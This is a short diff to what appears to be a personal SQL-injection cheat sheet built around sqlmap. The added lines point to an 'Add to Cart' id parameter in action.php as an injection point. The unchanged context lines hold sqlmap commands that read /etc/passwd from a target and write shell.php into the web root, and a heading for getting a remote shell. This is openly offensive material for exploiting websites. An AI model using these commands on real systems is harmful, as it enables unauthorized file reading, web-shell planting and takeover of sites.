@@ -93,6 +93,10 @@ ________________________________________________________________________________
 
 #sqlmap -r file.txt --file-read "/etc/passwd"
 #sqlmap -r file.txt --file-read "shell.php" --file-dest "/var/www/html/shell.php"
+______________________________________________________________________________________________________________________________________________________________________
+# When you buy the product
+# Add to Cart has always has id parameter ( it turns out with action.php )
+
 
 
 # Remote Shell with sqlmap
